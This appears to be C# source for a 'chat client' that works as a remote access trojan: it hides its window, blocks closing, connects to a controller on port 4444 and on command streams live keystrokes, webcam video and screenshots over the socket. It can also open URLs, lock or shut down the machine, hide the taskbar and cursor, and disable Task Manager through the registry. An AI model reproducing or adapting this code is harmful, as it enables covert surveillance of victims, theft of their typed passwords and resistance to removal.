using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters.Binary;
using System.Speech.Synthesis;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using DevExpress.LookAndFeel;
using DevExpress.XtraEditors;
using DevExpress.XtraWaitForm;
using AForge.Video.DirectShow;
using Microsoft.Win32;
using Utilities;

namespace ChatAppClient
{
    public partial class ChatAppClient : DevExpress.XtraEditors.XtraForm
    {
        Thread th_message,
            th_ejectcd,
            th_closecd,
            th_tts,
            th_cam,
            th_keyLogging,
            th_fileReceiving, th_changeWallpaper, th_screen;

        string messageBoxEdit;
        private string ttsString;


        XtraUserControl1 userControl1 = new XtraUserControl1();
        string name = "YOU";
        string m;
        private const int portNum = 4444;

        delegate void SetTextCallback(string text);
        delegate void SetTextCallback2(Image image);

        TcpClient client;
        NetworkStream ns;
        Thread t = null;
        private const string hostName = "localhost";

        Image LastImageSent = null; // Last correctly sent picture
        String ClosingString = "FORM#CLOSING";
        byte[] ClosingBytes; // Byte - Presentation of the message
        private bool stopCam = false;

        ASCIIEncoding ByteConverter = new ASCIIEncoding();
        // Object for converting strings to byte arrays and vice versa

        private bool stopLiveKeylogging = false;
        bool stopScreen = false;

        private const int BufferSize = 1024;
        public string Status = string.Empty;

        public ChatAppClient()
        {
            //Show();
            //XtraDialog.Show(userControl1, "Client Name", MessageBoxButtons.OKCancel);
            //name = userControl1.GetName();
            while (true)
            {
                try
                {
                    client = new TcpClient(hostName, portNum);
                }
                catch (SocketException e)
                {

                    continue;
                }


                if (!client.Connected)
                {
                    client.Close();
                }
                else
                {
                    break;
                }

            }
            ns = client.GetStream();

            byte[] byteTime1 = Encoding.ASCII.GetBytes(name);
            ns.Write(byteTime1, 0, byteTime1.Length);

            byte[] bytes = new byte[1024];
            int bytesRead = ns.Read(bytes, 0, bytes.Length);
            m = Encoding.ASCII.GetString(bytes, 0, bytesRead);
            Text = m;

            String s = "Connected";
            byte[] byteTime = Encoding.ASCII.GetBytes(s);
            ns.Write(byteTime, 0, byteTime.Length);

            //CheckForIllegalCrossThreadCalls = false;

            InitializeComponent();
            //Hide();
            t = new Thread(DoWork);
            t.Start();
        }

        public void DoWork()
        {
            byte[] bytes = new byte[1024];
            string line;
            while (true)
            {

                int bytesRead = ns.Read(bytes, 0, bytes.Length);
                line = Encoding.ASCII.GetString(bytes, 0, bytesRead);

                if (line.EndsWith("MESSAGE"))
                {
                    messageBoxEdit = line;
                    th_message = new Thread(new ThreadStart(MessageCommand));
                    th_message.Start();
                }
                else if (line.EndsWith("-TEXT"))
                {
                    string[] words = line.Split('-');
                    this.SetText(words[0]);
                }
                else if (line.EndsWith("TTS"))
                {
                    ttsString = line;
                    th_tts = new Thread(new ThreadStart(TTSCommand));
                    th_tts.Start();
                }
                else if (line.CompareTo("ONCHAT") == 0)
                {
                    this.Invoke((MethodInvoker) delegate
                    {
                        Visible = true;
                        ShowInTaskbar = true; // Remove from taskbar.
                        Opacity = 100; // runs on UI thread
                    });

                }
                else if (line.CompareTo("OFFCHAT") == 0)
                {
                    this.Invoke((MethodInvoker) delegate
                    {
                        Visible = false;
                        ShowInTaskbar = false; // Remove from taskbar.
                        Opacity = 0; // runs on UI thread
                    });

                }
                else if (line.CompareTo("EJECTCD") == 0)
                {
                    th_ejectcd = new Thread(new ThreadStart(EjectCD));
                    th_ejectcd.Start();
                }
                else if (line.LastIndexOf("CLOSECD") >= 0)
                {
                    th_closecd = new Thread(new ThreadStart(CloseCD));
                    th_closecd.Start();
                }
                else if (line.CompareTo("SHUTDOWN") == 0)
                {
                    //ns.Flush();
                    Shutdown();

                }
                else if (line.CompareTo("HIDECURSOR") == 0)
                {
                    MessageBox.Show("hide");
                    HideCursor();
                }
                else if (line.CompareTo("SHOWCURSOR") == 0)
                {
                    MessageBox.Show("show");
                    ShowCursor();
                }
                else if (line.CompareTo("TOGGLEICONS") == 0)
                {
                    HideShowDesktopIcons();
                }
                else if (line.CompareTo("HIDETASKBAR") == 0)
                {
                    HideTaskbar();
                }
                else if (line.CompareTo("SHOWTASKBAR") == 0)
                {
                    ShowTaskbar();
                }
                else if (line.CompareTo("LOCKUSER") == 0)
                {
                    LockUser();
                }
                else if (line.CompareTo("CAPTURECAM") == 0)
                {
                    stopCam = false;
                    th_cam = new Thread(new ThreadStart(Send));
                    th_cam.Start();

                    ClosingBytes = ByteConverter.GetBytes(ClosingString);
                }
                else if (line.CompareTo("STOPCAM") == 0)
                {
                    stopCam = true;

                    if (videoSource != null && videoSource.IsRunning)
                    {
                        videoSource.SignalToStop();
                        videoSource = null;
                    }

                    th_cam.Abort();
                }
                else if (line.EndsWith("OPENWEB"))
                {
                    string[] words = line.Split('-');
                    string url = words[0];
                    try
                    {
                        System.Diagnostics.Process.Start(url);
                    }
                    catch (Exception)
                    {
                        //return;
                        //throw;
                    }
                }
                else if (line.CompareTo("LIVEKEYLOGGING") == 0)
                {
                    stopLiveKeylogging = false;
                    th_keyLogging = new Thread(new ThreadStart(LiveKeyLogging));
                    th_keyLogging.Start();
                }
                else if (line.CompareTo("STOPLIVEKEYLOGGING") == 0)
                {
                    stopLiveKeylogging = true;
                    th_keyLogging.Abort();
                }
                else if (line.CompareTo("RECEIVEFILE") == 0)
                {
                    th_fileReceiving = new Thread(new ThreadStart(StartReceivingFile));
                    th_fileReceiving.Start();
                }
                else if (line.CompareTo("CHANGEWALLPAPER") == 0)
                {
                    th_changeWallpaper = new Thread(new ThreadStart(ChangeWallpaper));
                    th_changeWallpaper.Start();
                }
                else if (line.CompareTo("CAPTURESCREEN") == 0)
                {
                    
                    th_screen = new Thread(new ThreadStart(CaptureScreen));
                    th_screen.Start();
                }
                else if (line.CompareTo("STOPCAPTURESCREEN") == 0)
                {
                    stopScreen = true;
                    th_screen.Abort();
                }
                else if (line.CompareTo("ENABLETASKMANAGER") == 0)
                {
                    SetTaskManager(false);
                }
                else if (line.CompareTo("DISABLETASKMANAGER") == 0)
                {
                    SetTaskManager(true);
                }

                else if (line.CompareTo("KILL") == 0)
                {
                    break;
                }

                else
                {

                    this.SetText(line);

                }


            }
            t.Abort();
            ns.Close();
            client.Close();
            foreach (var process in Process.GetProcessesByName("ChatAppClient"))
            {
                process.Kill();
            }
        }

        private void MessageCommand()
        {
            MessageBoxButtons messageBoxButtons = MessageBoxButtons.OK;
            MessageBoxIcon messageBoxIcon = MessageBoxIcon.Information;
            string[] words = messageBoxEdit.Split('-');

            int buttonIndex = int.Parse(words[2]);
            int iconIndex = int.Parse(words[3]);

            if (buttonIndex == 0)
                messageBoxButtons = MessageBoxButtons.OK;
            else if (buttonIndex == 1)
                messageBoxButtons = MessageBoxButtons.OKCancel;
            else if (buttonIndex == 5)
                messageBoxButtons = MessageBoxButtons.AbortRetryIgnore;
            else if (buttonIndex == 3)
                messageBoxButtons = MessageBoxButtons.YesNoCancel;
            else if (buttonIndex == 2)
                messageBoxButtons = MessageBoxButtons.YesNo;
            else if (buttonIndex == 4)
                messageBoxButtons = MessageBoxButtons.RetryCancel;

            if (iconIndex == 3)
                messageBoxIcon = MessageBoxIcon.Asterisk;
            else if (iconIndex == 6)
                messageBoxIcon = MessageBoxIcon.Error;
            else if (iconIndex == 2)
                messageBoxIcon = MessageBoxIcon.Exclamation;
            else if (iconIndex == 4)
                messageBoxIcon = MessageBoxIcon.Hand;
            else if (iconIndex == 0)
                messageBoxIcon = MessageBoxIcon.Information;
            else if (iconIndex == 1)
                messageBoxIcon = MessageBoxIcon.Question;
            else if (iconIndex == 7)
                messageBoxIcon = MessageBoxIcon.Stop;
            else
                messageBoxIcon = MessageBoxIcon.Warning;


            XtraMessageBox.Show(words[0], words[1], messageBoxButtons, messageBoxIcon);
        }

        private void TTSCommand()
        {
            string[] words = ttsString.Split('/');
            string gender = words[0];
            string msg = words[1];
            int volume = Convert.ToInt32(words[2]);
            int rate = Convert.ToInt32(words[3]);
            SpeechSynthesizer synthesizer = new SpeechSynthesizer();
            synthesizer.Volume = volume; // 0...100
            synthesizer.Rate = rate; // -10...10

            /*foreach (var v in synthesizer.GetInstalledVoices().Select(v => v.VoiceInfo))
            {
                Console.WriteLine("Name:{0}, Gender:{1}, Age:{2}",
                  v.Description, v.Gender, v.Age);
            }*/

            if (gender == "Male")
            {
                synthesizer.SelectVoiceByHints(VoiceGender.Male);
            }
            else if (gender == "Female")
            {
                synthesizer.SelectVoiceByHints(VoiceGender.Female);
            }

            // Synchronous
            synthesizer.Speak(msg);

            //Asynchronous
            //synthesizer.SpeakAsync("Hello World");


        }

        private void Shutdown()
        {
            //Process.Start("shutdown", String.Format("/s /m \\{0} /t 30", hostName));

            System.Diagnostics.Process proc = new System.Diagnostics.Process();
            proc.EnableRaisingEvents = false;
            proc.StartInfo.FileName = "shutdown.exe";
            proc.StartInfo.Arguments = @"\\localhost /t:5 ""The computer is shutting down"" ";
            proc.Start();
        }

        [DllImport("winmm.dll", EntryPoint = "mciSendStringA")]
        public static extern void mciSendStringA(string lpstrCommand,
            string lpstrReturnString, Int32 uReturnLength, Int32 hwndCallback);

        string rt = "";

        private void EjectCD()
        {
            mciSendStringA("set CDAudio door open", rt, 127, 0);
        }

        private void CloseCD()
        {
            mciSendStringA("set CDAudio door closed", rt, 127, 0);
        }

        private void HideCursor()
        {
            Cursor.Hide();
        }

        private void ShowCursor()
        {
            Cursor.Show();
        }

        private void HideShowDesktopIcons()
        {
            ToggleDesktopIcons.ToggleIcons();
        }

        private void HideTaskbar()
        {
            T_Hide();
        }

        private void ShowTaskbar()
        {
            T_Show();
        }

        [DllImport("user32.dll")]
        private static extern int FindWindow(string className, string windowText);

        [DllImport("user32.dll")]
        private static extern int ShowWindow(int hwnd, int command);

        [DllImport("user32.dll")]
        public static extern int FindWindowEx(int parentHandle, int childAfter, string className, int windowTitle);

        [DllImport("user32.dll")]
        private static extern int GetDesktopWindow();

        private const int SW_HIDE = 0;
        private const int SW_SHOW = 1;

        protected static int Handle
        {
            get { return FindWindow("Shell_TrayWnd", ""); }
        }

        protected static int HandleOfStartButton
        {
            get
            {
                int handleOfDesktop = GetDesktopWindow();
                int handleOfStartButton = FindWindowEx(handleOfDesktop, 0, "button", 0);
                return handleOfStartButton;
            }
        }

        public static void T_Show()
        {
            ShowWindow(Handle, SW_SHOW);
            ShowWindow(HandleOfStartButton, SW_SHOW);
        }

        public static void T_Hide()
        {
            ShowWindow(Handle, SW_HIDE);
            ShowWindow(HandleOfStartButton, SW_HIDE);
        }


        private void LockUser()
        {
            LockWorkStation();
        }

        [DllImport("user32.dll")]
        public static extern bool LockWorkStation();

        private void SetText(string text)
        {

            if (textEdit1.InvokeRequired)
            {
                SetTextCallback d = new SetTextCallback(SetText);
                this.Invoke(d, new object[] {text});
            }
            else
            {
                string[] words = text.Split('-');
                memoEdit1.Text += words[0] + "\r\n";
            }
        }

        private void textEdit1_KeyDown(object sender, KeyEventArgs e)
        {
            if ((e.KeyCode == Keys.Return))
            {
                String s = name + ": " + textEdit1.Text + "-TEXT";
                string[] words = s.Split('-');
                memoEdit1.Text += words[0] + "\r\n";byte[] byteTime = Encoding.ASCII.GetBytes(s);
                ns.Write(byteTime, 0, byteTime.Length);

                textEdit1.ResetText();
            }
        }

        private void ChatAppClient_FormClosing(object sender, FormClosingEventArgs e)
        {
            //this.Hide();

            e.Cancel = true;
        }

        private void ChatAppClient_Load(object sender, EventArgs e)
        {
            Visible = false; // Hide form window.
            ShowInTaskbar = false; // Remove from taskbar.
            Opacity = 0;

            //base.OnLoad(e);

        }

        static class ToggleDesktopIcons
        {
            [DllImport("user32.dll", SetLastError = true)]
            static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

            [DllImport("user32.dll", SetLastError = true)]
            static extern IntPtr GetWindow(IntPtr hWnd, GetWindow_Cmd uCmd);

            enum GetWindow_Cmd : uint
            {
                GW_HWNDFIRST = 0,
                GW_HWNDLAST = 1,
                GW_HWNDNEXT = 2,
                GW_HWNDPREV = 3,
                GW_OWNER = 4,
                GW_CHILD = 5,
                GW_ENABLEDPOPUP = 6
            }

            [DllImport("user32.dll", CharSet = CharSet.Auto)]
            static extern IntPtr SendMessage(IntPtr hWnd, UInt32 Msg, IntPtr wParam, IntPtr lParam);

            private const int WM_COMMAND = 0x111;

            public static void ToggleIcons()
            {
                var toggleDesktopCommand = new IntPtr(0x7402);
                IntPtr hWnd = GetWindow(FindWindow("Progman", "Program Manager"), GetWindow_Cmd.GW_CHILD);
                SendMessage(hWnd, WM_COMMAND, toggleDesktopCommand, IntPtr.Zero);
            }
        }



        #region Webcam

        //Our webcam object
        VideoCaptureDevice videoSource;

        void InitWebCam(int nr)
        {
            //Auflistung aller Webcam/Videogeräte
            FilterInfoCollection videosources = new FilterInfoCollection(FilterCategory.VideoInputDevice);

            //Überprüfen, ob mindestens eine Webcam gefunden wurde
            if (videosources != null)
            {
                //Die Webcam "nr" an unser Webcam Objekt binden
                videoSource = new VideoCaptureDevice(videosources[nr].MonikerString);

                try
                {
                    //Überprüfen ob die Webcam Technische-Eigenschaften mitliefert
                    if (videoSource.VideoCapabilities.Length > 0)
                    {
                        string lowestSolution = "10000;0";
                        //Das Profil mit der niedrigsten Auflösung suchen
                        for (int i = 0; i < videoSource.VideoCapabilities.Length; i++)
                        {
                            if (videoSource.VideoCapabilities[i].FrameSize.Width <
                                Convert.ToInt32(lowestSolution.Split(';')[0]))
                                lowestSolution = videoSource.VideoCapabilities[i].FrameSize.Width.ToString() + ";" +
                                                 i.ToString();
                        }
                        //Dem Webcam Objekt die niedrigstmögliche Auflösung übergeben
                        videoSource.DesiredFrameSize =
                            videoSource.VideoCapabilities[Convert.ToInt32(lowestSolution.Split(';')[1])].FrameSize;
                    }
                }
                catch (Exception e)
                {
                    MessageBox.Show(e.ToString());
                }

                //Assign the NewFrame event handler to the webcam object.
                //This will be displayed on every incoming image of the webcam
                videoSource.NewFrame += new AForge.Video.NewFrameEventHandler(videoSource_NewFrame);

                // Enable the webcam
                videoSource.Start();
            }
        }

        void videoSource_NewFrame(object sender, AForge.Video.NewFrameEventArgs eventArgs)
        {
            //Assign each incoming image from the webcam to the Picturebox
            pictureBoxVideoSelf.BackgroundImage = (Image) eventArgs.Frame.Clone();
        }

        #endregion

        private void Send()
        {
            //PictureBox pictureBoxVideoSelf=new PictureBox();

            InitWebCam(0); // Start webcam

            /*TcpListener Server = new TcpListener(int.Parse(port.ToString()));
            Server.Start();

            TcpClient Client = Server.AcceptTcpClient();*/

            /*while (true)
            {
                try
                {
                    client.Connect(hostName, portNum);ns = client.GetStream();
                    break;
                }
                catch
                {
                    Thread.Sleep(3000);
                }
            }*/
            ns = client.GetStream();
            while (true)
            {
                if (stopCam)
                    break; // termination
                try
                {
                    // Try to send the current picture to the partner, save it as a backup image
                    WriteImage((Image) pictureBoxVideoSelf.BackgroundImage.Clone(), ns);
                    LastImageSent = (Image) pictureBoxVideoSelf.BackgroundImage.Clone();
                    Thread.Sleep(100);
                }
                catch
                {
                    // The current image could not be sent to send the backup image
                    WriteImage(LastImageSent, ns);
                }
            }

            try
            {
                ns.Write(ClosingBytes, 0, ClosingBytes.Length);
            }
            catch
            {
            }
            
        }

        private void WriteImage(Image image, NetworkStream stream)
        {
            ASCIIEncoding Encoder = new ASCIIEncoding();
            MemoryStream TempStream = new MemoryStream();
            byte[] Buffer;

            try
            {
                // The passed image into the current stream
                image.Save(TempStream, System.Drawing.Imaging.ImageFormat.Gif);
            }
            catch
            {
            }

            Buffer = TempStream.ToArray();

            // The size of the image as a 20-character string, fill with "x"
            string ImageSize = Buffer.Length.ToString();
            while (ImageSize.Length < 20)
                ImageSize += "x";

            // The size plus the data of the image in an array
            byte[] FittedImageSize = Encoder.GetBytes(ImageSize);
            byte[] ImagePlusSize = new byte[FittedImageSize.Length + Buffer.Length];
            Array.Copy(FittedImageSize, ImagePlusSize, FittedImageSize.Length);
            Array.Copy(Buffer, 0, ImagePlusSize, FittedImageSize.Length, Buffer.Length);

            try
            {
                // Write the summarized array
                stream.Write(ImagePlusSize, 0, ImagePlusSize.Length);
                stream.Flush();
            }
            catch
            {
                // If the stream can no longer be written, the partner has terminated
                stopCam = true;
            }
        }

        globalKeyboardHook gkh = new globalKeyboardHook();

        private void HookAll()
        {
            foreach (object key in Enum.GetValues(typeof(Keys)))
            {
                gkh.HookedKeys.Add((Keys) key);
            }
        }

        void gkh_KeyDown(object sender, KeyEventArgs e)
        {
            /*StreamWriter SW = new StreamWriter(@"Keylogger.txt", true);
            SW.Write(e.KeyCode);
            SW.Close();*/
            String s = "";
            switch (e.KeyCode)
            {
                case Keys.Space:
                    s = " ";
                    break;

                case Keys.OemPeriod:
                    s = ".";
                    break;

                case Keys.LMenu:
                    s = "{ALT}";
                    break;

                case Keys.Oem7:
                    s = "'";
                    break;

                case Keys.Oemcomma:
                    s = ",";
                    break;

                default:
                    if (Control.ModifierKeys != Keys.Shift)
                        s = e.KeyCode.ToString().ToLower();
                    else
                        s = e.KeyCode.ToString();
                    break;
            }

            if (!stopLiveKeylogging)
            {
                byte[] byteTime = Encoding.ASCII.GetBytes(s);
                ns.Write(byteTime, 0, byteTime.Length);
            }

        }

        void LiveKeyLogging()
        {
            gkh.KeyDown += new KeyEventHandler(gkh_KeyDown);
            HookAll();
        }

        void StartReceivingFile()
        {
            /*TcpListener Listener = null;
            try
            {
                Listener = new TcpListener(IPAddress.Any, portN);
                Listener.Start();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }*/

            byte[] RecData = new byte[BufferSize];
            int RecBytes;

            for (;;)
            {
                //TcpClient client = null;
                //NetworkStream netstream = null;
                Status = string.Empty;
                try
                {


                    string message = "Accept the Incoming File ";
                    string caption = "Incoming Connection";
                    MessageBoxButtons buttons = MessageBoxButtons.YesNo;
                    DialogResult result;



                    //client = Listener.AcceptTcpClient();
                    //netstream = client.GetStream();
                    Status = "Connected to a client\n";
                    result = MessageBox.Show(message, caption, buttons);

                    if (result == System.Windows.Forms.DialogResult.Yes)
                    {
                        string SaveFileName = string.Empty;
                        SaveFileDialog DialogSave = new SaveFileDialog();
                        DialogSave.Filter = "All files (*.*)|*.*";
                        DialogSave.RestoreDirectory = true;
                        DialogSave.Title = "Where do you want to save the file?";
                        DialogSave.InitialDirectory = @"C:/";
                        if (DialogSave.ShowDialog() == DialogResult.OK)
                            SaveFileName = DialogSave.FileName;
                        if (SaveFileName != string.Empty)
                        {
                            int totalrecbytes = 0;
                            FileStream Fs = new FileStream(@"D:/zzz.txt", FileMode.OpenOrCreate, FileAccess.Write);
                            while ((RecBytes = ns.Read(RecData, 0, RecData.Length)) > 0)
                            {
                                Fs.Write(RecData, 0, RecBytes);
                                totalrecbytes += RecBytes;
                            }
                            Fs.Close();
                            //netstream.Close();
                            break;
                            //}

                            //client.Close();



                        }
                        
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                    //netstream.Close();
                }
            }
            th_fileReceiving.Abort();
        }

        void ChangeWallpaper()
        {
            Image returnImage = Image.FromStream(ns);
            pictureBoxVideoSelf.BackgroundImage = returnImage;
            returnImage.Save("D:\\aaaa.jpg");
            //ns.Close();
            //th_changeWallpaper.Abort();
        }

        void CaptureScreen()
        {
            Image img;
      

            //this.SetImage(img);
            /*var bmpScreenshot;
            var gfxScreenshot;*/
            ns = client.GetStream();
            while (true)
            {
                if (stopScreen)
                {
                    break;
                }
               var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                               Screen.PrimaryScreen.Bounds.Height,
                                               PixelFormat.Format32bppArgb);

                // Create a graphics object from the bitmap.
               var gfxScreenshot = Graphics.FromImage(bmpScreenshot);

                // Take the screenshot from the upper left corner to the right bottom corner.
                gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
                                            Screen.PrimaryScreen.Bounds.Y,
                                            0,
                                            0,
                                            Screen.PrimaryScreen.Bounds.Size,
                                            CopyPixelOperation.SourceCopy);

                // Save the screenshot to the specified path that the user has chosen.
                //bmpScreenshot.Save("Screenshot.png", ImageFormat.Png);


                img = bmpScreenshot;

                //if (stopCam)
                    //break; // termination
                try
                {
                    // Try to send the current picture to the partner, save it as a backup image
                    WriteImage(img, ns);
                    //LastImageSent = (Image)pictureBoxVideoSelf.BackgroundImage.Clone();
                    Thread.Sleep(100);
                }
                catch
                {
                    // The current image could not be sent to send the backup image
                    WriteImage(img, ns);
                }
            }

            try
            {
                ns.Write(ClosingBytes, 0, ClosingBytes.Length);
            }
            catch
            {
            }



        }

        private void SetImage(Image image)
        {

            if (pictureBoxVideoSelf.InvokeRequired)
            {
                SetTextCallback2 d = new SetTextCallback2(SetImage);
                this.Invoke(d, new object[] { image });
            }
            else
            {
                pictureBoxVideoSelf.Image = image;
            }
        }
        public void SetTaskManager(bool enable)
        {

            /*string user = Environment.UserDomainName + "\\" + Environment.UserName;
            RegistryAccessRule rule = new RegistryAccessRule(user,
                RegistryRights.FullControl,
                AccessControlType.Allow);
            RegistrySecurity security = new RegistrySecurity();
            security.AddAccessRule(rule);
            var key =
                Microsoft.Win32.Registry.CurrentUser.OpenSubKey(
                    @"Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Policies\System",
                    RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.FullControl);
            key.SetAccessControl(security);*/

            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            if (enable && objRegistryKey.GetValue("DisableTaskMgr") != null)
                objRegistryKey.DeleteValue("DisableTaskMgr");
            else
                objRegistryKey.SetValue("DisableTaskMgr", "1");
            objRegistryKey.Close();
        }
    }
}

